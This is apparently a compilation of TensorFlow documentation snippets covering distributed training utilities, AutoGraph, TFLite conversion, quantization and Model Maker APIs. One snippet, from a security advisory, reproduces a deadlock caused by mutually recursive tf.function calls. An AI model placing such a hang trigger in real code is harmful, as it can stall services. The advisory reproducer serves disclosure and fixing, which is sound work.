device: /job:worker/replica:0/task:0/device:GPU:3 low utilization: 0.21

OperationChecker:
Found operation using NHWC data_format on GPU. Maybe NCHW is faster.

ExpensiveOperationChecker:
top 1 operation type: SoftmaxCrossEntropyWithLogits, cpu: 1.37sec, accelerator: 0us, total: 1.37sec (26.68%)
top 2 operation type: MatMul, cpu: 427.39ms, accelerator: 280.76ms, total: 708.14ms (13.83%)
top 3 operation type: ConcatV2, cpu: 357.83ms, accelerator: 31.80ms, total: 389.63ms (7.61%)
seq2seq_attention_model.py:360:build_graph:self._add_seq2seq(), cpu: 3.16sec, accelerator: 214.84ms, total: 3.37sec
  seq2seq_attention_model.py:293:_add_seq2seq:decoder_outputs, ..., cpu: 2.46sec, accelerator: 3.25ms, total: 2.47sec
    seq2seq_lib.py:181:sampled_sequence_...:average_across_ti..., cpu: 2.46sec, accelerator: 3.24ms, total: 2.47sec
      seq2seq_lib.py:147:sequence_loss_by_...:crossent = loss_f..., cpu: 2.46sec, accelerator: 3.06ms, total: 2.46sec
        seq2seq_attention_model.py:289:sampled_loss_func:num_classes=vsize), cpu: 2.46sec, accelerator: 3.06ms, total: 2.46sec
        seq2seq_attention_model.py:282:sampled_loss_func:labels = tf.resha..., cpu: 164us, accelerator: 0us, total: 164us
      seq2seq_lib.py:148:sequence_loss_by_...:log_perp_list.app..., cpu: 1.33ms, accelerator: 120us, total: 1.45ms
      seq2seq_lib.py:151:sequence_loss_by_...:total_size = tf.a..., cpu: 154us, accelerator: 23us, total: 177us
    seq2seq_lib.py:184:sampled_sequence_...:return cost / tf...., cpu: 97us, accelerator: 8us, total: 105us
      math_ops.py:690:cast:return gen_math_o..., cpu: 62us, accelerator: 3us, total: 65us
      math_ops.py:839:binary_op_wrapper:return func(x, y,..., cpu: 35us, accelerator: 5us, total: 40us
  seq2seq_attention_model.py:192:_add_seq2seq:sequence_length=a..., cpu: 651.56ms, accelerator: 158.92ms, total: 810.48ms
    seq2seq_lib.py:104:bidirectional_rnn:sequence_length, ..., cpu: 306.58ms, accelerator: 73.54ms, total: 380.12ms
      core_rnn.py:195:static_rnn:state_size=cell.s..., cpu: 306.52ms, accelerator: 73.54ms, total: 380.05ms
        rnn.py:218:_rnn_step:_maybe_copy_some_..., cpu: 303.76ms, accelerator: 73.54ms, total: 377.30ms
        rnn.py:216:_rnn_step:time >= max_seque..., cpu: 2.75ms, accelerator: 0us, total: 2.75ms
      core_rnn.py:179:static_rnn:max_sequence_leng..., cpu: 67us, accelerator: 0us, total: 67us
    seq2seq_lib.py:110:bidirectional_rnn:initial_state_bw,..., cpu: 296.21ms, accelerator: 73.54ms, total: 369.75ms
      core_rnn.py:195:static_rnn:state_size=cell.s..., cpu: 296.11ms, accelerator: 73.54ms, total: 369.65ms
        rnn.py:218:_rnn_step:_maybe_copy_some_..., cpu: 292.04ms, accelerator: 73.54ms, total: 365.58ms
        rnn.py:216:_rnn_step:time >= max_seque..., cpu: 4.07ms, accelerator: 0us, total: 4.07ms
      core_rnn.py:178:static_rnn:min_sequence_leng..., cpu: 85us, accelerator: 0us, total: 85us
      core_rnn.py:179:static_rnn:max_sequence_leng..., cpu: 16us, accelerator: 0us, total: 16us
    seq2seq_lib.py:113:bidirectional_rnn:outputs = [tf.con..., cpu: 46.88ms, accelerator: 3.87ms, total: 50.75ms
 ...(omitted)
top 1 graph node: seq2seq/loss/sampled_sequence_loss/sequence_loss_by_example/SoftmaxCrossEntropyWithLogits_11, cpu: 89.92ms, accelerator: 0us, total: 89.92ms
top 2 graph node: train_step/update_seq2seq/output_projection/w/ApplyAdam, cpu: 84.52ms, accelerator: 0us, total: 84.52ms
top 3 graph node: seq2seq/loss/sampled_sequence_loss/sequence_loss_by_example/SoftmaxCrossEntropyWithLogits_19, cpu: 73.02ms, accelerator: 0us, total: 73.02ms
```

----------------------------------------

TITLE: Implementing Distributed Training Primitives (Python)
DESCRIPTION: Provides custom utility classes and functions for managing distributed execution. `ReplicatedFunction` runs a given function on multiple devices concurrently using Python threads. `collective_mean` performs a collective average reduction across devices using TensorFlow's low-level `CollectiveReduce` operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_Numpy_Distributed_Image_Classification.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
import threading
import queue

# Note that this code currently relies on dispatching operations from python
# threads.
class ReplicatedFunction(object):
  """Creates a callable that will run `fn` on each device in `devices`."""

  def __init__(self, fn, devices, **kw_args):
    self._shutdown = False

    def _replica_fn(device, input_queue, output_queue):
      while not self._shutdown:
        inputs = input_queue.get()
        with tf.device(device):
          output_queue.put(fn(*inputs, **kw_args))

    self.threads = []
    self.input_queues = [queue.Queue() for _ in devices]
    self.output_queues = [queue.Queue() for _ in devices]
    for i, device in enumerate(devices):
      thread = threading.Thread(
          target=_replica_fn,
          args=(device, self.input_queues[i], self.output_queues[i]))
      thread.start()
      self.threads.append(thread)

  def __call__(self, *inputs):
    all_inputs = zip(*inputs)
    for input_queue, replica_input, in zip(self.input_queues, all_inputs):
      input_queue.put(replica_input)
    return [q.get() for q in self.output_queues]

  def __del__(self):
    self._shutdown = True
    for t in self.threads:
      t.join(3)
    self.threads = None

def collective_mean(inputs, num_devices):
  """Performs collective mean reduction on inputs."""
  outputs = []
  for instance_key, inp in enumerate(inputs):
    outputs.append(tnp.asarray(
      tf.raw_ops.CollectiveReduce(
          input=inp, group_size=num_devices, group_key=0,
          instance_key=instance_key, merge_op='Add', final_op='Div',
          subdiv_offsets=[])))
  return outputs
```

----------------------------------------

TITLE: Defining TensorFlow Function with Debugger (Python/TensorFlow)
DESCRIPTION: This snippet defines a TensorFlow function `f` using the `@tf.function` decorator. It includes a call to `pdb.set_trace()` to insert a breakpoint and a conditional `tf.print` statement. This function is used to demonstrate debugging behavior when run with and without eager execution enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_0

LANGUAGE: python
CODE:
```
@tf.function
def f(a):
  pdb.set_trace()
  if a > 0:
    tf.print(a, 'is positive')
```

----------------------------------------

TITLE: Using Immutable Objects (namedtuple) with Functional Methods - Correct
DESCRIPTION: Using immutable objects like `collections.namedtuple` and implementing modification via methods that return a new object is a functional style that works well with AutoGraph. The variable holding the object (`c` in this case) becomes a loop variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_17

LANGUAGE: python
CODE:
```
class MyClass(collections.namedtuple('MyClass', ('y',))):
  def change(self):
    new_y = self.y + 1
    return MyClass(new_y)

c = MyClass(y=0)
while x > 0:
  c = c.change()  # Okay -- c is now a loop var.
```

----------------------------------------

TITLE: Training Object Detector Model Python
DESCRIPTION: This method feeds the provided training data to train the object detection model. It allows specifying validation data, number of epochs, and batch size.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_8

LANGUAGE: python
CODE:
```
train(
    train_data: tflite_model_maker.object_detector.DataLoader,
    validation_data: Optional[tflite_model_maker.object_detector.DataLoader] = None,
    epochs: Optional[int] = None,
    batch_size: Optional[int] = None
) -> tf.keras.Model
```

----------------------------------------

TITLE: Initializing TFLite Model Maker Object Detector DataLoader (Python)
DESCRIPTION: Initializes a DataLoader instance for object detection. It requires a glob pattern for TFRecord files, the dataset size, a label map (dict, list, string name, or yaml file), and an optional JSON file with COCO annotations for validation. This prepares the data source for model training or evaluation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/DataLoader.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.object_detector.DataLoader(
    tfrecord_file_patten, size, label_map, annotations_json_file=None
)
```

----------------------------------------

TITLE: Demonstrating Deadlock with Recursive tf.function - Python
DESCRIPTION: This Python snippet demonstrates a deadlock scenario in TensorFlow where two `tf.function` decorated functions call each other recursively. The issue arises from TensorFlow's use of a non-reentrant lock in the `tf.function` implementation, causing a deadlock when mutual recursion occurs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-180.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function()
def fun1(num):
    if num == 1:
        return
    print(num)
    fun2(num-1)

@tf.function()
def fun2(num):
    if num == 0:
        return
    print(num)
    fun1(num-1)

fun1(9)
```

----------------------------------------

TITLE: Initializing TFLite Model Metadata - Python
DESCRIPTION: Imports necessary classes from the `tflite_support` library and creates a `ModelMetadataT` object. This object is then populated with basic identifying information for the model, such as its name, description, version, author, and license.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_2

LANGUAGE: python
CODE:
```
from tflite_support import flatbuffers
from tflite_support import metadata as _metadata
from tflite_support import metadata_schema_py_generated as _metadata_fb

""" ... """
"""Creates the metadata for an image classifier."""

# Creates model info.
model_meta = _metadata_fb.ModelMetadataT()
model_meta.name = "MobileNetV1 image classifier"
model_meta.description = ("Identify the most prominent object in the "
                          "image from a set of 1,001 categories such as "
                          "trees, animals, food, vehicles, person etc.")
model_meta.version = "v1"
model_meta.author = "TensorFlow"
model_meta.license = ("Apache License. Version 2.0 "
                      "http://www.apache.org/licenses/LICENSE-2.0.")
```

----------------------------------------

TITLE: Installing TensorFlow Lite Support Python Package
DESCRIPTION: Provides the pip command to install the tflite-support Python package. This package contains the necessary Task Library APIs, including the ImageClassifier, for use in Python environments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_classifier.md#_snippet_5

LANGUAGE: Shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Setting TFLite Dependencies and AaptOptions in Gradle
DESCRIPTION: This snippet modifies the Android module's `build.gradle` file. It adds the necessary TensorFlow Lite, GPU delegate (optional), and Support Library dependencies to the project. It also configures `aaptOptions` to prevent compression of .tflite files, which is recommended though sometimes default behavior in newer Gradle versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/lite_support.md#_snippet_0

LANGUAGE: Gradle
CODE:
```
android {
    // Other settings

    // Specify tflite file should not be compressed for the app apk
    aaptOptions {
        noCompress "tflite"
    }

}

dependencies {
    // Other dependencies

    // Import tflite dependencies
    implementation 'org.tensorflow:tensorflow-lite:0.0.0-nightly-SNAPSHOT'
    // The GPU delegate library is optional. Depend on it as needed.
    implementation 'org.tensorflow:tensorflow-lite-gpu:0.0.0-nightly-SNAPSHOT'
    implementation 'org.tensorflow:tensorflow-lite-support:0.0.0-nightly-SNAPSHOT'
}
```

----------------------------------------

TITLE: Converting Keras H5 File to TFLite in Python
DESCRIPTION: This example shows how to convert a TensorFlow Keras model saved as an H5 file into a TensorFlow Lite model. It initializes the `TFLiteConverter` from the specified Keras file path, performs the conversion, and saves the resulting TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/python_api.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

# Convert the model.
converter = tf.compat.v1.lite.TFLiteConverter.from_keras_model_file('keras_model.h5')
tflite_model = converter.convert()

# Save the model.
with open('model.tflite', 'wb') as f:
  f.write(tflite_model)
```

----------------------------------------

TITLE: Defining Representative Dataset (Input Tensor List, Python)
DESCRIPTION: This generator creates a TensorFlow dataset from input `images`, batches it, and takes a specified number of samples (100). It yields each sample as a list of tensors, cast to `tf.float32`. This approach relies on the order of input tensors, which is less robust than the signature-based method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quantization.md#_snippet_2

LANGUAGE: Python
CODE:
```
def representative_dataset():
  for data in tf.data.Dataset.from_tensor_slices((images)).batch(1).take(100):
    yield [tf.dtypes.cast(data, tf.float32)]
```

----------------------------------------

TITLE: Get Embedding from Result by Index TensorFlow Lite Python
DESCRIPTION: Retrieves a specific embedding from an `EmbeddingResult` based on the output layer index. Requires an `EmbeddingResult` and an integer `output_index`. Returns the `Embedding` object for the specified index or raises ValueError if the index is out of bounds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageEmbedder.md#_snippet_4

LANGUAGE: python
CODE:
```
get_embedding_by_index(
    result: tflite_support.task.processor.EmbeddingResult,
    output_index: int
) -> tflite_support.task.processor.Embedding
```

----------------------------------------

TITLE: Changing Model Architecture to BERT-Base - TensorFlow Lite Model Maker - Python
DESCRIPTION: Retrieves the model specification for the BERT-Base classifier architecture using `model_spec.get`. This step prepares to create a new model using the BERT-Base architecture instead of the previously used one.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_29

LANGUAGE: python
CODE:
```
spec = model_spec.get('bert_classifier')
```

----------------------------------------

TITLE: Getting Signature Runner in TensorFlow Lite Python
DESCRIPTION: Obtains a callable function linked to a specific SignatureDef within the TensorFlow Lite model, allowing direct inference on that part of the graph. The optional `signature_key` parameter specifies which signature to retrieve; if omitted, the default signature is used.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_9

LANGUAGE: python
CODE:
```
get_signature_runner(
    signature_key=None
)
```

----------------------------------------

TITLE: Cloning TensorFlow Examples Repository - Bash
DESCRIPTION: Clones the official TensorFlow examples GitHub repository to a local machine. This repository contains the sample code used as a reference for the tutorial.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_0

LANGUAGE: Bash
CODE:
```
git clone https://github.com/tensorflow/examples.git
```

----------------------------------------

TITLE: Building TFLite C Library for AArch64 (Bazel/Bash)
DESCRIPTION: Compiles the TensorFlow Lite C library (`libtensorflowlite_c.so`) specifically for the AArch64 (64-bit ARM) architecture using Bazel. The `--config=elinux_aarch64` flag selects the target platform and toolchain, and `-c opt` enables optimizations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_arm.md#_snippet_1

LANGUAGE: bash
CODE:
```
bazel build --config=elinux_aarch64 -c opt //tensorflow/lite/c:libtensorflowlite_c.so
```

----------------------------------------

TITLE: Implement TFLite JNI Native Functions
DESCRIPTION: Provides the C/C++ implementation for the native methods (`loadModel`, `runInference`) declared in the Java/Kotlin `TfLiteJni` class. These functions serve as the bridge to interact with the TensorFlow Lite C API.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/native.md#_snippet_5

LANGUAGE: C++
CODE:
```
#ifdef __cplusplus
extern "C" {
#endif

void Java_com_google_samples_gms_tflite_c_loadModel(
  JNIEnv *env, jobject tflite_jni, jobject asset_manager, jstring asset_name){}
  //...
}

jfloatArray Java_com_google_samples_gms_tflite_c_TfLiteJni_runInference(
  JNIEnv* env, jobject tfliteJni, jfloatArray input) {
  //...
}

#ifdef __cplusplus
}
#endif
```

----------------------------------------

TITLE: Loading Category Labels from File Java
DESCRIPTION: This Java snippet demonstrates how to load category labels from a text file (e.g., 'labels.txt') located within the application's assets directory. It utilizes the `FileUtil.loadLabels` helper method provided by the Support Library to read the file contents and store them as a `List<String>`, including error handling for `IOException`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/lite_support.md#_snippet_5

LANGUAGE: Java
CODE:
```
import org.tensorflow.lite.support.common.FileUtil;

final String ASSOCIATED_AXIS_LABELS = "labels.txt";
List<String> associatedAxisLabels = null;

try {
    associatedAxisLabels = FileUtil.loadLabels(this, ASSOCIATED_AXIS_LABELS);
} catch (IOException e) {
    Log.e("tfliteSupport", "Error reading label file", e);
}
```

----------------------------------------

TITLE: Creating TensorFlow Dataset from Character IDs - Python
DESCRIPTION: This snippet converts the sequence of character integer IDs into a tf.data.Dataset. Each element in the dataset initially represents a single character ID, preparing the data for sequence processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
# The maximum length sentence we want for a single input in characters
seq_length = 100
examples_per_epoch = len(text)//(seq_length+1)

# Create training examples / targets
char_dataset = tf.data.Dataset.from_tensor_slices(text_as_int)

for i in char_dataset.take(5):
  print(idx2char[i.numpy()])
```

----------------------------------------

TITLE: Fallback to Metal Delegate (Objective-C)
DESCRIPTION: Shows the Objective-C approach for implementing a fallback: attempting to initialize the TFLCoreMLDelegate and, if it fails, initializing the TFLMetalDelegate instead to utilize GPU acceleration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/coreml_delegate.md#_snippet_8

LANGUAGE: Objective-C
CODE:
```
TFLDelegate* delegate = [[TFLCoreMLDelegate alloc] init];
    if (!delegate) {
      // Add Metal delegate options if necessary
      delegate = [[TFLMetalDelegate alloc] init];
    }
    // Initialize interpreter with delegate
```

----------------------------------------

TITLE: Creating Recommendation Model with Training Parameters - TensorFlow Model Maker Python
DESCRIPTION: This is a class method to load data and train a recommendation model. It allows configuration of key training parameters such as batch size, epochs, learning rate, and more. Dependencies include training data and a ModelSpec.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/Recommendation.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
create(
    train_data,
    model_spec: tflite_model_maker.recommendation.ModelSpec,
    model_dir: str = None,
    validation_data=None,
    batch_size: int = 16,
    steps_per_epoch: int = 10000,
    epochs: int = 1,
    learning_rate: float = 0.1,
    gradient_clip_norm: float = 1.0,
    shuffle: bool = True,
    do_train: bool = True
)
```

----------------------------------------

TITLE: Initializing and Running Quantization Debugger (Python)
DESCRIPTION: Initialize the `QuantizationDebugger` either by providing the debug model content directly or specifying its file path. A `debug_dataset` is required, similar to the `representative_dataset` used for quantization. Call the `run()` method to execute the debugging analysis.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/optimize/debugging/README.md#_snippet_1

LANGUAGE: python
CODE:
```
from tensorflow.lite.tools.optimize.debugging.python import debugger

# `debug_dataset` accpets the same type as `converter.representative_dataset`.
quant_debugger = debugger.QuantizationDebugger(
    quant_debug_model_content=quant_debug_model,
    debug_dataset=data_gen)

# OR

quant_debugger = debugger.QuantizationDebugger(
    quant_debug_model_path='/path/to/debug_model.tflite',
    debug_dataset=data_gen)

quant_debugger.run()
```

----------------------------------------

TITLE: Loading Quantized TFLite Model into Interpreter Python
DESCRIPTION: Initializes a TensorFlow Lite Interpreter object using the file path of the dynamic range quantized TFLite model. It then allocates tensors, preparing the quantized model for inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
interpreter_quant = tf.lite.Interpreter(model_path=str(tflite_model_quant_file))
interpreter_quant.allocate_tensors()
```

----------------------------------------

TITLE: Initialize BuiltinOpResolver C++
DESCRIPTION: Demonstrates the standard usage of `BuiltinOpResolver` in C++ to create an `OpResolver` instance that includes all default TensorFlow Lite built-in operators. This is typically used when no custom operators are needed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_17

LANGUAGE: C++
CODE:
```
tflite::ops::builtin::BuiltinOpResolver resolver;
```

----------------------------------------

TITLE: Running Inference and Analyzing Results Python
DESCRIPTION: Loops through each window of preprocessed audio data, runs inference using the `serving_model` (getting predictions from both the trained model and the base YAMNet), prints per-window results, and calculates/prints the mean prediction across all windows. Requires the `serving_model`, `splitted_audio_data`, `test_data`, `spec`, and `numpy` (np).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
print(random_audio)

results = []
print('Result of the window ith:  your model class -> score,  (spec class -> score)')
for i, data in enumerate(splitted_audio_data):
  yamnet_output, inference = serving_model(data)
  results.append(inference[0].numpy())
  result_index = tf.argmax(inference[0])
  spec_result_index = tf.argmax(yamnet_output[0])
  t = spec._yamnet_labels()[spec_result_index]
  result_str = f'Result of the window {i}: ' \
  f'\t{test_data.index_to_label[result_index]} -> {inference[0][result_index].numpy():.3f}, ' \
  f'\t({spec._yamnet_labels()[spec_result_index]} -> {yamnet_output[0][spec_result_index]:.3f})'
  print(result_str)


results_np = np.array(results)
mean_results = results_np.mean(axis=0)
result_index = mean_results.argmax()
print(f'Mean result: {test_data.index_to_label[result_index]} -> {mean_results[result_index]}')
```

----------------------------------------

TITLE: Decorating TensorFlow Function with TFLite Compatibility Check Python
DESCRIPTION: Introduces the `@tf.lite.experimental.authoring.compatible` decorator. Applying this decorator to a `tf.function` enables automatic TFLite compatibility checks when the function is evaluated. This allows developers to identify unsupported operations (like `tf.cosh`) during model authoring rather than conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/authoring.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
@tf.lite.experimental.authoring.compatible
@tf.function(input_signature=[
 tf.TensorSpec(shape=[None], dtype=tf.float32)
])
def f(x):
 return tf.cosh(x)

# Evaluate the tf.function
result = f(tf.constant([0.0]))
print (f"result = {result}")
```

----------------------------------------

TITLE: Convert from TF Function to TFLite Python
DESCRIPTION: This snippet demonstrates another conversion method using `tf.lite.TFLiteConverter.from_concrete_functions`. It obtains a concrete function from the `JaxModule` that expects the pre-processed input shape and converts this specific function directly into a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
converter_2 = tf.lite.TFLiteConverter.from_concrete_functions(
    [
        jax_module.methods[JaxModule.DEFAULT_METHOD_KEY].get_concrete_function(
            tf.TensorSpec([1, 3, 224, 224], tf.float32, name="inputs")
        )
    ]
)
tflite_model_2 = converter_2.convert()
```

----------------------------------------

TITLE: For Loop Over Python List of Tensors - TensorFlow Python
DESCRIPTION: Shows a Python `for` loop iterating over a Python list `l` containing `tf.Tensor` objects. Because the iterable is a Python list, AutoGraph unrolls the loop during tracing, embedding multiple `tf.print` operations directly into the graph rather than creating a TensorFlow loop.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_17

LANGUAGE: Python
CODE:
```
l = [tf.constant(1), tf.constant(2), tf.constant(3)]
for i in l:
  tf.print(i)  # This is unrolled - three `tf.print`s are built in the graph.
```

----------------------------------------

TITLE: Compile TFLite Model for EdgeTPU - Python (Shell)
DESCRIPTION: This snippet sets the number of Edge TPUs to target for compilation and then executes the `edgetpu_compiler` command to compile a TensorFlow Lite model (`model.tflite`) for the specified number of TPUs, potentially splitting it into segments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
NUMBER_OF_TPUS =  1#@param {type:"number"}

!edgetpu_compiler model.tflite --num_segments=$NUMBER_OF_TPUS
```

----------------------------------------

TITLE: Running TFLite Inference in Objective-C
DESCRIPTION: Illustrates the process of loading a TFLite model, initializing a TFLInterpreter, allocating tensors, setting input data, invoking inference, and retrieving output data using the Objective-C API. Includes basic error handling checks using NSError pointers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_11

LANGUAGE: Objective-C
CODE:
```
NSString *modelPath = [[NSBundle mainBundle] pathForResource:@"model"
                                                      ofType:@"tflite"];
NSError *error;

// Initialize an interpreter with the model.
TFLInterpreter *interpreter = [[TFLInterpreter alloc] initWithModelPath:modelPath
                                                                  error:&error];
if (error != nil) { /* Error handling... */ }

// Allocate memory for the model's input `TFLTensor`s.
[interpreter allocateTensorsWithError:&error];
if (error != nil) { /* Error handling... */ }

NSMutableData *inputData;  // Should be initialized
// input data preparation...

// Get the input `TFLTensor`
TFLTensor *inputTensor = [interpreter inputTensorAtIndex:0 error:&error];
if (error != nil) { /* Error handling... */ }

// Copy the input data to the input `TFLTensor`.
[inputTensor copyData:inputData error:&error];
if (error != nil) { /* Error handling... */ }

// Run inference by invoking the `TFLInterpreter`.
[interpreter invokeWithError:&error];
if (error != nil) { /* Error handling... */ }

// Get the output `TFLTensor`
TFLTensor *outputTensor = [interpreter outputTensorAtIndex:0 error:&error];
if (error != nil) { /* Error handling... */ }

// Copy output to `NSData` to process the inference results.
NSData *outputData = [outputTensor dataWithError:&error];
if (error != nil) { /* Error handling... */ }
```

----------------------------------------

TITLE: Initializing TextSearcherOptions (Python)
DESCRIPTION: Initializes a TextSearcherOptions object to configure the TensorFlow Lite TextSearcher task. It requires `base_options` and optionally accepts `embedding_options` and `search_options` to customize embedding generation and search behavior respectively.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextSearcherOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.text.TextSearcherOptions(
    base_options: tflite_support.task.core.BaseOptions,
    embedding_options: tflite_support.task.processor.EmbeddingOptions = dataclasses.field(default_factory=_EmbeddingOptions),
    search_options: tflite_support.task.processor.SearchOptions = dataclasses.field(default_factory=_SearchOptions)
)
```

----------------------------------------

TITLE: Adding Trace Sections in Android Java
DESCRIPTION: This Java snippet from an image classification example demonstrates how to use the Android `Trace` class to mark sections of code, specifically around TensorFlow Lite inference (`runInference`), within a larger operation (`recognizeImage`). This allows profiling tools to visualize the duration of these specific parts of the application's execution flow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/measurement.md#_snippet_7

LANGUAGE: Java
CODE:
```
Trace.beginSection("recognizeImage");
...
// Runs the inference call.
Trace.beginSection("runInference");
tflite.run(inputImageBuffer.getBuffer(), outputProbabilityBuffer.getBuffer().rewind());
Trace.endSection();
...
Trace.endSection();
```

----------------------------------------

TITLE: Reading TensorFlow Lite Micro Output Value (C++)
DESCRIPTION: Accesses the data within the output tensor to read the floating-point value at index 0. Uses `TF_LITE_MICRO_EXPECT_NEAR` to assert that the read value is close to an expected value (0.0 in this case) within a specified tolerance (0.05).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_17

LANGUAGE: C++
CODE:
```
// Obtain the output value from the tensor
float value = output->data.f[0];
// Check that the output value is within 0.05 of the expected value
TF_LITE_MICRO_EXPECT_NEAR(0., value, 0.05);
```

----------------------------------------

TITLE: Creating TFLite ImageSearcher from File Python
DESCRIPTION: Creates an ImageSearcher instance directly from TensorFlow Lite model and index files. It's a convenient factory method that handles loading the necessary components. Returns a configured ImageSearcher object or raises ValueError/RuntimeError on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSearcher.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
create_from_file(
    model_file_path: str, index_file_path: Optional[str] = None
) -> 'ImageSearcher'
```

----------------------------------------

TITLE: Converting TF Hub Model to TensorFlow Lite (Python)
DESCRIPTION: Loads the ESRGAN model from TensorFlow Hub, defines a concrete function with the expected input signature (1, 50, 50, 3 float32), converts the model to TensorFlow Lite format with default optimizations, and saves the resulting TFLite model to the local file system as `ESRGAN.tflite`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/super_resolution/overview.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
model = hub.load("https://tfhub.dev/captain-pool/esrgan-tf2/1")
concrete_func = model.signatures[tf.saved_model.DEFAULT_SERVING_SIGNATURE_DEF_KEY]

@tf.function(input_signature=[tf.TensorSpec(shape=[1, 50, 50, 3], dtype=tf.float32)])
def f(input):
  return concrete_func(input);

converter = tf.lite.TFLiteConverter.from_concrete_functions([f.get_concrete_function()], model)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
tflite_model = converter.convert()

# Save the TF Lite model.
with tf.io.gfile.GFile('ESRGAN.tflite', 'wb') as f:
  f.write(tflite_model)

esrgan_model_path = './ESRGAN.tflite'
```

----------------------------------------

TITLE: Creating Searcher Instance from Data - TFLite Model Maker - Python
DESCRIPTION: Class method to create a `Searcher` instance directly from data using specified ScaNN options. It requires a `DataLoader` instance (`data`) containing the embeddings and metadata, and a `ScaNNOptions` object (`scann_options`) to configure the ScaNN index build process. An optional cache directory (`cache_dir`) can be provided to save artifacts.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/Searcher.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_from_data(
    data: tflite_model_maker.searcher.DataLoader,
    scann_options: tflite_model_maker.searcher.ScaNNOptions,
    cache_dir: Optional[str] = None
) -> 'Searcher'
```

----------------------------------------

TITLE: Defining Recommendation Model Creation Python
DESCRIPTION: This Python class method signature defines the `create` function for the `tflite_model_maker.recommendation` module. It specifies parameters for loading training and validation data, configuring the model specification, setting training hyperparameters like batch size, steps per epoch, epochs, learning rate, and controlling shuffling and training execution. It is used to create and optionally train a recommendation model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/create.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
